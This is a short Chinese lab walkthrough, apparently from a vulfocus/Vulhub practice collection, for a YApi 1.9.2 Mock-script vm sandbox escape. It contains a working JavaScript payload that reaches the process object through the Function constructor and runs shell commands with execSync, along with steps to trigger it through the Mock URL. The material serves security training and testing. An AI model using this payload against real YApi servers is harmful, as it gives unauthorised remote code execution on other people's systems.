# 184｜YApi Mock 脚本沙箱逃逸

- 镜像：`vulfocus/yapi:latest`
- 题库端口：`3000,27017`
- 无 CVE（社区 0day；1.9.2 vm 逃逸，1.9.3 修）

## 一句话打法

开放注册 → 建项目/接口 → 高级 Mock 脚本用 `Function('return process')` 逃逸 → 打开 Mock URL 执行。[S1][S2]

## 操作步骤

1. 打开 `:3000`，注册普通用户并创建项目与接口。[S1]
2. 在接口 **高级 Mock → 脚本** 粘贴（变量名必须是 **`mockJson`**）：[S1][S2]

   ```javascript
   const sandbox = this
   const ObjectConstructor = this.constructor
   const FunctionConstructor = ObjectConstructor.constructor
   const myfun = FunctionConstructor('return process')
   const process = myfun()
   mockJson = process.mainModule.require("child_process").execSync("id;uname -a;pwd").toString()
   ```

3. 保存后到预览页复制 Mock 地址（`/mock/{projectId}/{path}`）并 GET。[S1]
4. 成功信号：响应正文为命令输出。[S1][S5]

## 本题特有排坑

- 写成 `mockjson`（小写 j）不会赋值成功。[S2]
- 部分命令会弄坏解析，公开记录建议 `id` / `ls`。[S5]
- 这是 Mock 沙箱，不是 Mongo 注入题。[S1]
- Vulhub/vulfocus 常见 **1.9.2**；1.9.3 后 vm 链失效，更后面还有 safeify 问题（#2809），以镜像版本为准。[S6]

## 来源

- [S1] Vulhub yapi/unacc README。详见[来源清单](../sources/184_yapi/_meta.md)。
- [S2] YMFE #2233。详见[来源清单](../sources/184_yapi/_meta.md)。
- [S3] sechub 分析。详见[来源清单](../sources/184_yapi/_meta.md)。
- [S4] NSFocus 处置说明。详见[来源清单](../sources/184_yapi/_meta.md)。
- [S5] NOSEC Vulfocus YApi 记录。详见[来源清单](../sources/184_yapi/_meta.md)。
- [S6] YMFE #2809。详见[来源清单](../sources/184_yapi/_meta.md)。
